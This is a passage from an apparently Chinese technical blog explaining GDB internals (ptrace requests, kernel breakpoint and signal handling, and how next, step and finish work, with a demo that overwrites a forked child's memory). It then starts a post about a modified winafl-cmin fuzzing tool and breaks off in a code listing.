*data)</span></span>;</span><br></pre></td></tr></table></figure><p>其中 <code>request</code> 参数指定了我们要使用 ptrace 的什么功能, 大致可以分为以下几类:</p><ul><li>PTRACE_ATTACH 或 PTRACE_TRACEME 建立进程间的跟踪关系;<ul><li>PTRACE_TRACEME 是被跟踪子进程调用的, 表示让父进程来跟踪自己, 通常是通过 GDB 启动新进程的时候使用;</li><li>PTRACE_ATTACH 是父进程调用 attach 到已经运行的子进程中; 这个命令会有权限的检查, non-root 的进程不能 attach 到 root 进程中;</li></ul></li><li>PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSR 等读取子进程内存/寄存器中保留的值;</li><li>PTRACE_POKETEXT, PTRACE_POKEDATA, PTRACE_POKEUSR 等修改被跟踪进程的内存/寄存器;</li><li>PTRACE_CONT，PTRACE_SYSCALL, PTRACE_SINGLESTEP 控制被跟踪进程以何种方式继续运行;<ul><li>PTRACE_SYSCALL 会让被调用进程在每次 进入/退出 系统调用时都触发一次 SIGTRAP; strace 就是通过调用它来实现的, 在每次进入系统调用的时候读取出系统调用参数, 在退出系统调用的时候读取出返回值;</li><li>PTRACE_SINGLESTEP 会在每执行完一条指令后都触发一次 SIGTRAP; GDB 的 nexti, next 命令都是通过它来实现的;</li></ul></li><li>PTRACE_DETACH, PTRACE_KILL 脱离进程间的跟踪关系;<ul><li>当父进程在子进程之前结束时, trace 关系会被自动解除;</li></ul></li></ul><p>参数 pid 表示的是要跟踪进程的 pid, addr 表示要监控的被跟踪子进程的地址.</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>调用 <code>ptrace()</code> 系统函数时会触发调用内核的 <code>sys_ptrace()</code> 函数，由于不同的 CPU 架构有着不同的调试方式，所以 Linux 为每种不同的 CPU 架构实现了不同的 <code>sys_ptrace()</code> 函数，而本文主要介绍的是 <code>X86 CPU</code> 的调试方式，所以 <code>sys_ptrace()</code> 函数所在文件是 <code>linux-2.4.16/arch/i386/kernel/ptrace.c</code>。</p><p><code>sys_ptrace()</code> 函数的主体是一个 <code>switch</code> 语句，会传入的 <code>request</code> 参数不同进行不同的操作，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_ptrace</span><span class="params">(<span class="keyword">long</span> request, <span class="keyword">long</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">dummy</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, ret;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    read_lock(&amp;tasklist_lock);</span><br><span class="line">    child = find_task_by_pid(pid); <span class="comment">// 获取 pid 对应的进程 task_struct 对象</span></span><br><span class="line">    <span class="keyword">if</span> (child)</span><br><span class="line">        get_task_struct(child);</span><br><span class="line">    read_unlock(&amp;tasklist_lock);</span><br><span class="line">    <span class="keyword">if</span> (!child)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request == PTRACE_ATTACH) &#123;</span><br><span class="line">        ret = ptrace_attach(child);</span><br><span class="line">        <span class="keyword">goto</span> out_tsk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (request) &#123;</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKTEXT:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKDATA:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_PEEKUSR:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKETEXT:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKEDATA:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_POKEUSR:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_SYSCALL:</span><br><span class="line">    <span class="keyword">case</span> PTRACE_CONT:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_KILL: </span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_SINGLESTEP:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> PTRACE_DETACH:</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">out_tsk:</span><br><span class="line">    free_task_struct(child);</span><br><span class="line">out:</span><br><span class="line">    unlock_kernel();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以被追踪模式（PTRACE_TRACEME）为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">int</span> <span class="title">sys_ptrace</span><span class="params">(<span class="keyword">long</span> request, <span class="keyword">long</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;ptrace &amp; PT_PTRACED)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        current-&gt;ptrace |= PT_PTRACED; <span class="comment">// 标志 PTRACE 状态</span></span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ptrace()</code> 对 <code>PTRACE_TRACEME</code> 的处理就是把当前进程标志为 <code>PTRACE</code> 状态。</p><p>当一个进程被标记为 <code>PTRACE</code> 状态后，调用 <code>exec()</code> 函数去执行一个外部程序时，将会暂停当前进程的运行，并且发送一个 <code>SIGCHLD</code> 给父进程。父进程接收到 <code>SIGCHLD</code> 信号后就可以对被调试的进程进行调试。</p><p>我们来看看 <code>exec()</code> 函数是怎样实现上述功能的，<code>exec()</code> 函数的执行过程为 <code>sys_execve() -&gt; do_execve() -&gt; load_elf_binary()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_elf_binary</span><span class="params">(struct linux_binprm * bprm, struct pt_regs * regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;ptrace &amp; PT_PTRACED)</span><br><span class="line">        send_sig(SIGTRAP, current, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当进程被标记为 <code>PTRACE</code> 状态时，执行 <code>exec()</code> 函数后便会发送一个 <code>SIGTRAP</code> 的信号给当前进程。信号是通过 <code>do_signal()</code> 函数进行处理的，而对 <code>SIGTRAP</code> 信号的处理逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_signal</span><span class="params">(struct pt_regs *regs, <span class="keyword">sigset_t</span> *oldset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> signr;</span><br><span class="line"></span><br><span class="line">        spin_lock_irq(&amp;current-&gt;sigmask_lock);</span><br><span class="line">        signr = dequeue_signal(&amp;current-&gt;blocked, &amp;info);</span><br><span class="line">        spin_unlock_irq(&amp;current-&gt;sigmask_lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果进程被标记为 PTRACE 状态</span></span><br><span class="line">        <span class="keyword">if</span> ((current-&gt;ptrace &amp; PT_PTRACED) &amp;&amp; signr != SIGKILL) &#123;</span><br><span class="line">            <span class="comment">/* 让调试器运行  */</span></span><br><span class="line">            current-&gt;exit_code = signr;</span><br><span class="line">            current-&gt;state = TASK_STOPPED;   <span class="comment">// 让自己进入停止运行状态</span></span><br><span class="line">            notify_parent(current, SIGCHLD); <span class="comment">// 发送 SIGCHLD 信号给父进程</span></span><br><span class="line">            schedule();                      <span class="comment">// 让出CPU的执行权限</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码主要做了3件事：</p><ol><li>如果当前进程被标记为 PTRACE 状态，那么就使自己进入停止运行状态。</li><li>发送 SIGCHLD 信号给父进程。</li><li>让出 CPU 的执行权限，使 CPU 执行其他进程。</li></ol><p>当父进程（调试进程）接收到 <code>SIGCHLD</code> 信号后，表示被调试进程已经标记为被追踪状态并且停止运行，那么调试进程就可以开始进行调试了</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="断点属性"><a href="#断点属性" class="headerlink" title="断点属性"></a>断点属性</h3><ul><li>是否有条件（由 condition 命令修改）  </li><li>是否有忽略次数 （由 ignore 命令修改）</li><li>是否只针对某个线程有效（由 break 命令的 thread 参数指定）</li><li>是否是临时断点（由 tbreak 命令插入）</li></ul><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当我们用 GDB 设置断点时, GDB 会把断点处的指令修改成 <code>int 3</code>，同时把断点信息及修改前的指令保存起来. 当被调试子进程运行到断点处时, 便会执行 <code>int 3</code>命令, 从而产生 SIGTRAP 信号. 由于 GDB 已经用 ptrace 和调试进程建立了跟踪关系, 此时的 SIGTRAP 信号会被发送给 GDB, GDB 通过和已有的断点信息做对比 (通过指令位置) 来判断这次 SIGTRAP 是不是一个断点.如果是断点的话, 就回等待用户的输入以做进一步的处理. 如果用户的命令是继续执行的话, GDB 就会先恢复断点处的指令, 然后执行对应的代码.</p><blockquote><p>x86系列处理器从其第一代产品英特尔8086开始就提供了一条专门用来支持调试的指令，即INT  3。简单地说，这条指令的目的就是使CPU中断（break）到调试器，以供调试者对执行现场进行各种分析。当CPU执行到INT 3指令时，由于INT  3指令的设计目的就是中断到调试器，因此，CPU执行这条指令的过程也就是产生断点异常（breakpoint  exception，简称#BP）并转去执行异常处理例程的过程。在跳转到处理例程之前，CPU会保存当前的执行上下文，包括段寄存器、程序指针寄存器等内容。      </p></blockquote><p>上述描述的是软件断点，相应的还有硬件断点</p><blockquote><p>X86系统提供8个调试寄存器（DR0~DR7）和2个MSR用于硬件调试。其中前四个DR0 ~ DR3是硬件断点寄存器，可以放入内存地址或者IO地址，还可以设置为执行、修改等条件。CPU在执行的到这里并满足条件会自动停下来。</p></blockquote><h3 id="断点判断"><a href="#断点判断" class="headerlink" title="断点判断"></a>断点判断</h3><ul><li><p>导致目标程序本次停止运行的信号是不是 SIGTRAP </p></li><li><p>gdb把所有的断点位置都存放在一个链表中，命中判定即把被调试程序当前停止的位置和链表中的断点位置进行比较，看是断点产生的信号，还是无关信号。</p></li><li><p>若断点存在条件，此时条件是否满足</p></li><li><p>断点的忽略次数此时是否为 0 </p></li><li><p>若断点只针对某个线程有效，那么遇到该断点的线程是否就是断 点所设定的线程</p></li></ul><p>若前两个条件之一不满足，则认为目标程序本次是因随机信号而停止。 若后三个条件之一不满足，则认为目标程序本次没有命中断点， gdb 会让其继续运行。</p><h3 id="断点处理"><a href="#断点处理" class="headerlink" title="断点处理"></a>断点处理</h3><p>临时断点：当判定为断点命中之后，若该断 点为临时断点， gdb 就会将这个断点删除。也就是说，临时断点只命 中一次。可能用到临时断点的场合： </p><ul><li><p>用户通过 tbreak 命令显式插入</p></li><li><p>next 、 nexti 、 step 命令需要跨越函数调用的时候，由 gdb 自动 在函数返回地址处插入临时断点 </p></li><li><p>finish 命令需要在当前函数返回地址处插入临时断点</p></li><li><p>带参数的 until 命令需要在当前函数返回地址以及参数指定地址插 入临时断点 </p></li><li><p>在不支持硬件单步的架构上， gdb 需要逐指令插入临时断点来实 现软件单步</p></li></ul><p>gdb 将断点实际插入目标程序的时机：</p><p>当用户通过 break 命令设置一 个断点时，这个断点并不会立即生效，因为 gdb 此时只是在内部的断 点链表中为这个断点新创建了一个节点而已。 gdb 会在用户下次发出 继续目标程序运行的命令时，将所有断点插入目标程序，新设置的断 点到这个时候才会实际存在于目标程序中。与此相呼应，当目标程序 停止时， gdb 会将所有断点暂时从目标程序中清除。 </p><p>断点命中失败的情况下，跨越断点继续运行的过程： </p><ul><li>清除断点 </li><li>单步到断点的下一条指令 </li><li>恢复断点 </li><li>继续目标程序运行</li></ul><h3 id="修改子进程内存"><a href="#修改子进程内存" class="headerlink" title="修改子进程内存"></a>修改子进程内存</h3><p>gdb在调试的时候会修改断点处二进制码为0xcc，我们通过下面的例子来演示父进程如何修改子进程的内存:</p><ul><li>父进程创建子进程, 并先让子进程 sleep 一段时间以保证父进程能更早运行;</li><li>父进程通过 <code>PTRACE_ATTACH</code> 来和子进程建立跟踪关系;</li><li>父进程修改子进程的内存数据;</li><li>父进程通过调用 <code>PTRACE_CONT</code> 让子进程恢复执行;</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW(call) (&#123; int _ret = (int)(call); printf(<span class="meta-string">&quot;%s -&gt; %d\n&quot;</span>, #call, _ret); <span class="meta-keyword">if</span> (_ret &lt; 0) &#123; perror(NULL); &#125;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> changeme[] = <span class="string">&quot;This is  a test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> cdata[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int64_t</span> data;</span><br><span class="line">    &#125; u = &#123; <span class="string">&quot;Hijacked&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (pid) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* child */</span></span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Children Message: %s\n&quot;</span>, changeme);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* parent */</span></span><br><span class="line">            SHOW(ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">            SHOW(ptrace(PTRACE_POKEDATA, pid, changeme, u.data));</span><br><span class="line">            SHOW(ptrace(PTRACE_CONT, pid, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Parent Message: %s\n&quot;</span>, changeme);</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH, pid, 0, 0) -&gt; 0</span><br><span class="line">ptrace(PTRACE_POKEDATA, pid, changeme, u.data) -&gt; 0</span><br><span class="line">ptrace(PTRACE_CONT, pid, 0, 0) -&gt; 0</span><br><span class="line">Parent Message: This is  a test</span><br><span class="line"></span><br><span class="line">Children Message: Hijacked a test</span><br></pre></td></tr></table></figure><p>可以看出子进程中的字符串已经被修改了, 而父进程中的字符串依旧保持不变.</p><p>在调用 <code>ptrace(PTRACE_POKEDATA, pid, changeme, u.data)</code> 时, 最后一个参数实际上是按照 <code>int64_t</code> 来处理的.</p><h2 id="next"><a href="#next" class="headerlink" title="next"></a>next</h2><ul><li><p>NEXT 命令实现的是 C 代码级的单步。</p></li><li><p>执行 next 命令时， gdb 会计算出当前停止位置的 c 语句的第一条 指令的地址作为 step_range_start ，然后计算出当前停止位置下一 行的 c 语句的第一条指令的地址作为 step_range_end ，随后控制目标程序从当前停止位置开始走指令级单步，直至 pc 超出 step range 为止。</p></li><li><p>next 命令的结束条件： pc &lt; step_range_start || pc &gt;= step_range_end 。 </p></li><li><p>之所以不能简单地判断 pc 是否到达 step_range_end ，是因为 step_range_end 仅仅是 c 源代码意义上的下一行的第一条指令的地址，目标程序实际运行时未必就会到达那里。因此， next 命令的结束条件可以理解为只要 pc 离开当前源代码行即可。</p><p>  <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/blog/image-20210527093518978.png" alt="image-20210527093518978"></p></li></ul><h3 id="跨越函数"><a href="#跨越函数" class="headerlink" title="跨越函数"></a>跨越函数</h3><p>我们知道 next 是不会进入函数内部的，下面会介绍一下其原理。</p><p>next 命令跨越函数调用的过程： </p><ul><li>从当前停止位置开始走<strong>指令级</strong>单步； </li><li>走到子函数第一条指令时发现是函数调用，就在函数返 回地址插入一个临时断点； </li><li>让目标程序继续运行，通过子函数体，直至遇到之前插入的临时断点； </li><li>继续走指令级单步，直至满足 next 命令的结束条件为止。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/blog/image-20210527093915896.png" alt="image-20210527093915896"></p><h2 id="step-、nexti-、-stepi"><a href="#step-、nexti-、-stepi" class="headerlink" title="step 、nexti 、 stepi"></a>step 、nexti 、 stepi</h2><ul><li>step 命令和 next 命令一样，也是实现 c 源代码级的单步，对于简单 语句， step 完全等同于 next 。唯一不同的是，若单步过程中遇到函 数调用， step 命令将停止在子函数的起始处，而不是将其跨越（无 调试信息的子函数除外）。  </li><li>nexti 命令实现指令级单步，和 next 命令类似， nexti 命令单步过程中不会进入子函数调用。 </li><li>stepi 命令实现指令级单步，而且是严格的指令级单步，每次直接走 一条指令后即停止，不再区分是否存在函数调用。</li></ul><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><p>finish 命令会让目标程序继续执行完当前函数的剩余语句，并停止在 返回到上一级函数之后的第一条指令处（也就是调用当前函数时的返 回地址）。因此，实现 finish 命令时，只需找到当前函数的返回地址 ，并在该处插入一个临时断点，然后让目标程序继续运行，直至遇到 该断点而停止。</p><h2 id="随机信号的处理"><a href="#随机信号的处理" class="headerlink" title="随机信号的处理"></a>随机信号的处理</h2><p>对于 gdb 而言，导致目标程序本次停止的信号有随机和非随机之分。 非随机信号是指 gdb 已经预知其会发生或者本身就是 gdb 导致的信 号，也就是说，这些信号是具有明确的调试含义的，比如遇到断点指 令时的 SIGTRAP 。而随机信号则是 gdb 没有预知的、不了解其实际 含义的信号，比如因程序异常而导致的 SIGSEGV ，因定时机制而产 生的 SIGALRM ，或者是用户程序自己内部使用的信号。 </p><p>对于随机信号， gdb 提供了两个属性来决定对它的处理方式。一个是 当此信号发生时是否停止目标程序的运行，一个是在目标程序因此信 号而停止之后，用户发出继续目标程序运行的命令时，是否将此信号 交付给目标程序。 </p><p>可通过 info signals 命令查看信号的配置属性，并通过 handle signal 命令来修改信号的属性。</p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><p>先占个坑。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hiberabyss.github.io/2018/04/04/gdb-internal/">https://hiberabyss.github.io/2018/04/04/gdb-internal/</a></p><p><a href="https://www.cnblogs.com/xsln/p/ptrace.html">https://www.cnblogs.com/xsln/p/ptrace.html</a></p><p><a href="http://www.kgdb.info/wp-content/uploads/2011/04/GdbPrincipleChinese.pdf">http://www.kgdb.info/wp-content/uploads/2011/04/GdbPrincipleChinese.pdf</a></p><p><a href="https://cloud.tencent.com/developer/article/1742878">https://cloud.tencent.com/developer/article/1742878</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>魔改 Winafl-cmin.</title>
      <link href="posts/d9205468/"/>
      <url>posts/d9205468/</url>
      
        <content type="html"><![CDATA[<p>魔改的原因是某次在精简大概 2w+的样本时候，程序跑到最后一个文件崩溃了…这不仅要浪费大量时间去再次精简，对于我本人的心情也影响极大，所以抽了一点时间对该工具进行了魔改，魔改的也非常简单，但是基本解决了我目前所碰到的问题。</p><p>魔改后支持如下：</p><ol><li>支持 python3</li><li>增加 <code>output.txt</code> <code>crash_files.txt</code> <code>hang_files.txt</code> 分别记录输出文件、crash 文件、 hang 文件</li><li>增加 <code>-move</code> 命令，用以移动文件，我预想的场景是：精简过程中程序卡死，我们可以把已经筛选过得文件剔除出来，会节约很多时间。但是相应的精简的效果可能会对比正常结束略差，我们进行二次精简就可以了。</li><li>增加 <code>-copy</code> 命令，用以复制文件。</li></ol><p>大致更改的代码如下：</p><p><a href="https://github.com/0xfocu5/tools/blob/main/my-cmin.py">https://github.com/0xfocu5/tools/blob/main/my-cmin.py</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span 